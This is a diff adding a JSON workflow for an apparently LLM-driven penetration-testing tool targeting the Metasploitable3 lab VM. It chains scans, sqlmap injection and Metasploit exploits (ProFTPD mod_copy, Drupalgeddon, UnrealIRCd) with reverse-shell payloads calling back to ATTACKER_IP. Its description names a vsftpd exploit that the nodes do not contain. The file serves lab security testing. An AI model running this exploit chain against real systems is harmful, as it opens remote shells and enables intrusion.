@@ -1,0 +1,582 @@
+{
+  "socis_workflow_version": "1.0",
+  "name": "Metasploitable3 Full Penetration Test",
+  "description": "End-to-end PT workflow for Metasploitable3 (Ubuntu 14.04). Covers: full port scan, web enum, CVE/EPSS/KEV/PoC intel, SQLi (payroll_app.php), Drupalgeddon (CVE-2014-3704), vsftpd backdoor (CVE-2011-2523), UnrealIRCd (CVE-2010-2075), JWT testing, and automated reporting. Replace TARGET_IP and ATTACKER_IP before running.",
+  "nodes": [
+    {
+      "id": "70e04611-c029-455e-b868-0e97dbde7304",
+      "type": "start",
+      "position": {
+        "x": 600,
+        "y": 40
+      },
+      "data": {
+        "label": "Target",
+        "target": "TARGET_IP"
+      }
+    },
+    {
+      "id": "136e797b-6051-431c-933b-08ca0b585d18",
+      "type": "tool",
+      "position": {
+        "x": 300,
+        "y": 200
+      },
+      "data": {
+        "label": "Nmap Full Scan",
+        "tool": "nmap",
+        "nmap_action": "nmap_scan",
+        "flags": "-sV -sC -T4 --open",
+        "timeout": 600
+      }
+    },
+    {
+      "id": "13f7286b-8989-4e4b-a988-01451fb9ed46",
+      "type": "tool",
+      "position": {
+        "x": 900,
+        "y": 200
+      },
+      "data": {
+        "label": "Masscan Sweep",
+        "tool": "masscan",
+        "masscan_action": "masscan_top_ports",
+        "masscan_top": 1000,
+        "masscan_rate": 10000
+      }
+    },
+    {
+      "id": "fa1a8e01-ee94-4e05-a4b4-9f32864198f4",
+      "type": "tool",
+      "position": {
+        "x": 100,
+        "y": 400
+      },
+      "data": {
+        "label": "Nikto Web Scan",
+        "tool": "nikto",
+        "nikto_action": "nikto_scan"
+      }
+    },
+    {
+      "id": "3df83539-30e7-4804-be3e-508989f31497",
+      "type": "tool",
+      "position": {
+        "x": 450,
+        "y": 400
+      },
+      "data": {
+        "label": "Nuclei CVE Scan",
+        "tool": "nuclei",
+        "nuclei_action": "nuclei_cve_scan"
+      }
+    },
+    {
+      "id": "d8bb6e49-0acb-41f7-bf7c-31d26ed2e0dc",
+      "type": "tool",
+      "position": {
+        "x": 750,
+        "y": 400
+      },
+      "data": {
+        "label": "WAF Detection",
+        "tool": "waf",
+        "waf_action": "fingerprint_waf"
+      }
+    },
+    {
+      "id": "a69bdcf7-d1ab-4ab7-955a-a9bd84199864",
+      "type": "tool",
+      "position": {
+        "x": 1050,
+        "y": 400
+      },
+      "data": {
+        "label": "SSL Audit",
+        "tool": "ssl",
+        "ssl_host": "TARGET_IP"
+      }
+    },
+    {
+      "id": "d8c88a19-565d-4e2c-b06e-54eb16fd5d78",
+      "type": "tool",
+      "position": {
+        "x": 100,
+        "y": 600
+      },
+      "data": {
+        "label": "Gobuster Dir",
+        "tool": "gobuster",
+        "gobuster_mode": "dir",
+        "gobuster_url": "http://TARGET_IP",
+        "gobuster_wordlist": "common",
+        "gobuster_extensions": "php,html,txt"
+      }
+    },
+    {
+      "id": "88034746-3696-4f6d-a6af-7188b11cd290",
+      "type": "tool",
+      "position": {
+        "x": 450,
+        "y": 600
+      },
+      "data": {
+        "label": "ffuf Discovery",
+        "tool": "ffuf",
+        "ffuf_url": "http://TARGET_IP/FUZZ",
+        "ffuf_wordlist": "common",
+        "ffuf_extensions": "php,html"
+      }
+    },
+    {
+      "id": "dbdbaa88-b9b5-43c9-9e89-192e707e6523",
+      "type": "tool",
+      "position": {
+        "x": 800,
+        "y": 600
+      },
+      "data": {
+        "label": "OSINT Recon",
+        "tool": "osint",
+        "osint_tool": "whois_lookup"
+      }
+    },
+    {
+      "id": "2ebaa794-d7c3-4379-a981-9a0ab27009c4",
+      "type": "tool",
+      "position": {
+        "x": 1100,
+        "y": 600
+      },
+      "data": {
+        "label": "WPScan",
+        "tool": "wpscan",
+        "wpscan_action": "wp_scan",
+        "wpscan_url": "http://TARGET_IP/wordpress",
+        "wpscan_enumerate": "vp,vt,u"
+      }
+    },
+    {
+      "id": "33984743-ed95-4761-b83e-dccaf9c0a50e",
+      "type": "tool",
+      "position": {
+        "x": 100,
+        "y": 800
+      },
+      "data": {
+        "label": "CVE: Drupalgeddon",
+        "tool": "cve",
+        "cve_action": "lookup_cve",
+        "cve_cve_id": "CVE-2014-3704"
+      }
+    },
+    {
+      "id": "66be9e51-a923-470c-a5cd-f9cf68d15ad6",
+      "type": "tool",
+      "position": {
+        "x": 400,
+        "y": 800
+      },
+      "data": {
+        "label": "CVE: vsftpd Backdoor",
+        "tool": "cve",
+        "cve_action": "lookup_cve",
+        "cve_cve_id": "CVE-2011-2523"
+      }
+    },
+    {
+      "id": "24bb750d-db1d-4c4a-a1bc-dcb440fa8b70",
+      "type": "tool",
+      "position": {
+        "x": 700,
+        "y": 800
+      },
+      "data": {
+        "label": "CVE: UnrealIRCd",
+        "tool": "cve",
+        "cve_action": "lookup_cve",
+        "cve_cve_id": "CVE-2010-2075"
+      }
+    },
+    {
+      "id": "cf5723e6-201c-4ad9-a8d2-98e4e61ec140",
+      "type": "tool",
+      "position": {
+        "x": 1000,
+        "y": 800
+      },
+      "data": {
+        "label": "EPSS Bulk Scoring",
+        "tool": "epss",
+        "epss_action": "get_epss_scores_bulk",
+        "epss_cve_ids": "CVE-2014-3704,CVE-2011-2523,CVE-2010-2075"
+      }
+    },
+    {
+      "id": "acd62775-b5b9-4147-945b-fcb630ebcce6",
+      "type": "tool",
+      "position": {
+        "x": 300,
+        "y": 980
+      },
+      "data": {
+        "label": "CISA KEV Check",
+        "tool": "cisa_kev",
+        "kev_action": "check_kev",
+        "kev_cve_id": "CVE-2014-3704,CVE-2011-2523,CVE-2010-2075"
+      }
+    },
+    {
+      "id": "48eec695-c3bc-481f-90dd-5798fa0cf0e6",
+      "type": "tool",
+      "position": {
+        "x": 750,
+        "y": 980
+      },
+      "data": {
+        "label": "PoC Risk Summary",
+        "tool": "poc_index",
+        "poc_action": "poc_risk_summary",
+        "poc_cve_id": "CVE-2014-3704,CVE-2011-2523,CVE-2010-2075",
+        "poc_limit": 10
+      }
+    },
+    {
+      "id": "00ddcc44-85de-4ba5-8d0b-4a4a17112e68",
+      "type": "tool",
+      "position": {
+        "x": 300,
+        "y": 1160
+      },
+      "data": {
+        "label": "SQLMap Full Chain",
+        "tool": "sqlmap_full",
+        "sqlmap_url": "http://TARGET_IP/payroll_app.php",
+        "sqlmap_data": "user=a&password=b",
+        "sqlmap_level": 3,
+        "sqlmap_risk": 2,
+        "sqlmap_technique": "BEUSTQ"
+      }
+    },
+    {
+      "id": "6e0201cd-2d64-4e68-850b-2f3298de3480",
+      "type": "tool",
+      "position": {
+        "x": 750,
+        "y": 1160
+      },
+      "data": {
+        "label": "JWT Analysis",
+        "tool": "jwt",
+        "jwt_action": "test_alg_none",
+        "jwt_token": ""
+      }
+    },
+    {
+      "id": "d3bda74d-cf83-44ec-b15b-dd51dd9f2a2a",
+      "type": "tool",
+      "position": {
+        "x": 100,
+        "y": 1360
+      },
+      "data": {
+        "label": "Exploit ProFTPD mod_copy",
+        "tool": "metasploit",
+        "msf_action": "run_exploit",
+        "msf_module": "exploit/unix/ftp/proftpd_modcopy_exec",
+        "msf_target_port": 21,
+        "msf_check_first": false,
+        "msf_payload": "php/meterpreter/reverse_tcp",
+        "msf_lhost": "ATTACKER_IP",
+        "msf_lport": 4444,
+        "msf_options": {
+          "SITEPATH": "/var/www/html",
+          "TARGETURI": "/"
+        }
+      }
+    },
+    {
+      "id": "82f1a286-7d83-4b71-9f85-15ab6290fd90",
+      "type": "tool",
+      "position": {
+        "x": 450,
+        "y": 1360
+      },
+      "data": {
+        "label": "Exploit Drupalgeddon",
+        "tool": "metasploit",
+        "msf_action": "run_exploit",
+        "msf_module": "exploit/multi/http/drupal_drupageddon",
+        "msf_target_port": 80,
+        "msf_payload": "php/meterpreter/reverse_tcp",
+        "msf_lhost": "ATTACKER_IP",
+        "msf_lport": 4445,
+        "msf_options": {
+          "TARGETURI": "/drupal/"
+        },
+        "msf_check_first": false
+      }
+    },
+    {
+      "id": "0a7b1d7b-77ae-429a-a275-3eec6cbae15b",
+      "type": "tool",
+      "position": {
+        "x": 800,
+        "y": 1360
+      },
+      "data": {
+        "label": "Exploit UnrealIRCd",
+        "tool": "metasploit",
+        "msf_action": "run_exploit",
+        "msf_module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
+        "msf_target_port": 6697,
+        "msf_lhost": "ATTACKER_IP",
+        "msf_lport": 4446,
+        "msf_check_first": false,
+        "msf_payload": "cmd/unix/reverse"
+      }
+    },
+    {
+      "id": "0eb959aa-fdd4-4224-83d2-d45ccd3c97e9",
+      "type": "tool",
+      "position": {
+        "x": 1100,
+        "y": 1360
+      },
+      "data": {
+        "label": "List Sessions",
+        "tool": "metasploit",
+        "msf_action": "list_sessions"
+      }
+    },
+    {
+      "id": "9eac7c56-60ef-4898-8f4f-0187e5226229",
+      "type": "report",
+      "position": {
+        "x": 600,
+        "y": 1560
+      },
+      "data": {
+        "label": "PT Report",
+        "template": "default"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "id": "47eabb4d-50e7-49f8-b6a2-7ca2fbb747fb",
+      "source": "70e04611-c029-455e-b868-0e97dbde7304",
+      "target": "136e797b-6051-431c-933b-08ca0b585d18",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "320eee2a-6568-4292-ac14-b42c681bf38f",
+      "source": "70e04611-c029-455e-b868-0e97dbde7304",
+      "target": "13f7286b-8989-4e4b-a988-01451fb9ed46",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "3093a57c-1de4-46ce-96df-7e6a121783b0",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "fa1a8e01-ee94-4e05-a4b4-9f32864198f4",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "df71b2db-74dc-4f57-bd60-e1d083f7f10a",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "3df83539-30e7-4804-be3e-508989f31497",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "e1f30e20-2c5a-453f-9ab0-2fc03a55e358",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "d8bb6e49-0acb-41f7-bf7c-31d26ed2e0dc",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "e9be7a6b-e3f1-4f5d-9c15-aa192a76c9b0",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "a69bdcf7-d1ab-4ab7-955a-a9bd84199864",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "1f89bda9-4251-4d80-b6ba-6d7e3843000e",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "d8c88a19-565d-4e2c-b06e-54eb16fd5d78",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "5ece3947-b243-49c6-9281-08f073c74e1c",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "88034746-3696-4f6d-a6af-7188b11cd290",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "e4647fe3-243c-4e06-b2c1-ce2de874e7f3",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "dbdbaa88-b9b5-43c9-9e89-192e707e6523",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "0e82d728-0736-4247-b297-5d832797f7f1",
+      "source": "136e797b-6051-431c-933b-08ca0b585d18",
+      "target": "2ebaa794-d7c3-4379-a981-9a0ab27009c4",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "d3221f15-69d1-4cf8-bbbe-3069a811d188",
+      "source": "3df83539-30e7-4804-be3e-508989f31497",
+      "target": "33984743-ed95-4761-b83e-dccaf9c0a50e",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "7df6f172-364b-44e3-b22a-1768882ec5f6",
+      "source": "3df83539-30e7-4804-be3e-508989f31497",
+      "target": "66be9e51-a923-470c-a5cd-f9cf68d15ad6",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "b5f85797-5fec-46c9-99b8-b403bb28b3c8",
+      "source": "3df83539-30e7-4804-be3e-508989f31497",
+      "target": "24bb750d-db1d-4c4a-a1bc-dcb440fa8b70",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "d8701f63-7abd-4665-8b48-3f9e4ff5b870",
+      "source": "3df83539-30e7-4804-be3e-508989f31497",
+      "target": "cf5723e6-201c-4ad9-a8d2-98e4e61ec140",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "cdb1267f-1c7a-4be8-b9f5-d8961e187b70",
+      "source": "33984743-ed95-4761-b83e-dccaf9c0a50e",
+      "target": "acd62775-b5b9-4147-945b-fcb630ebcce6",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "c16dda17-1d73-4e31-82a3-87f942e16bbd",
+      "source": "33984743-ed95-4761-b83e-dccaf9c0a50e",
+      "target": "48eec695-c3bc-481f-90dd-5798fa0cf0e6",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "ff46d023-0e6f-45de-aec8-6ded7465d7b3",
+      "source": "fa1a8e01-ee94-4e05-a4b4-9f32864198f4",
+      "target": "00ddcc44-85de-4ba5-8d0b-4a4a17112e68",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "36b0eb04-7d2e-430f-9145-e58e74c9f624",
+      "source": "d8c88a19-565d-4e2c-b06e-54eb16fd5d78",
+      "target": "00ddcc44-85de-4ba5-8d0b-4a4a17112e68",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "31cb77c4-1c1e-4790-9358-394267084c24",
+      "source": "d8bb6e49-0acb-41f7-bf7c-31d26ed2e0dc",
+      "target": "6e0201cd-2d64-4e68-850b-2f3298de3480",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "216eb879-8628-413a-948b-a714104e6953",
+      "source": "48eec695-c3bc-481f-90dd-5798fa0cf0e6",
+      "target": "d3bda74d-cf83-44ec-b15b-dd51dd9f2a2a",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "3e8d212b-f4e6-430b-a97e-6ad844d23a35",
+      "source": "66be9e51-a923-470c-a5cd-f9cf68d15ad6",
+      "target": "d3bda74d-cf83-44ec-b15b-dd51dd9f2a2a",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "b0e0ddbf-3364-40ba-814e-db4ce75bb646",
+      "source": "33984743-ed95-4761-b83e-dccaf9c0a50e",
+      "target": "82f1a286-7d83-4b71-9f85-15ab6290fd90",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "4467bafa-67dc-4abc-a6ba-e8b4c89cf2b4",
+      "source": "24bb750d-db1d-4c4a-a1bc-dcb440fa8b70",
+      "target": "0a7b1d7b-77ae-429a-a275-3eec6cbae15b",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "8d9ab28c-6402-4851-b7e5-0cea8e276433",
+      "source": "d3bda74d-cf83-44ec-b15b-dd51dd9f2a2a",
+      "target": "0eb959aa-fdd4-4224-83d2-d45ccd3c97e9",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "8eed096f-016b-4b34-8c12-e20293a4df79",
+      "source": "82f1a286-7d83-4b71-9f85-15ab6290fd90",
+      "target": "0eb959aa-fdd4-4224-83d2-d45ccd3c97e9",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "c630c1b5-1df9-4358-8bf2-ade144767340",
+      "source": "0a7b1d7b-77ae-429a-a275-3eec6cbae15b",
+      "target": "0eb959aa-fdd4-4224-83d2-d45ccd3c97e9",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "f1cd2f7c-5526-49d0-8dae-bf27e642b02d",
+      "source": "00ddcc44-85de-4ba5-8d0b-4a4a17112e68",
+      "target": "9eac7c56-60ef-4898-8f4f-0187e5226229",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "5c8bc515-622e-4357-aa4a-d21d7a3e68af",
+      "source": "0eb959aa-fdd4-4224-83d2-d45ccd3c97e9",
+      "target": "9eac7c56-60ef-4898-8f4f-0187e5226229",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "8f2f4e9c-7a07-462f-85a0-b78eb9368ff9",
+      "source": "cf5723e6-201c-4ad9-a8d2-98e4e61ec140",
+      "target": "9eac7c56-60ef-4898-8f4f-0187e5226229",
+      "sourceHandle": null,
+      "targetHandle": null
+    },
+    {
+      "id": "aaa1966a-8920-409e-a891-f630a1780d75",
+      "source": "acd62775-b5b9-4147-945b-fcb630ebcce6",
+      "target": "9eac7c56-60ef-4898-8f4f-0187e5226229",
+      "sourceHandle": null,
+      "targetHandle": null
+    }
+  ],
+  "default_llm": {
+    "provider": "ollama_remote",
+    "model": "qwen2.5:7b",
+    "remote_url": null
+  }
+}
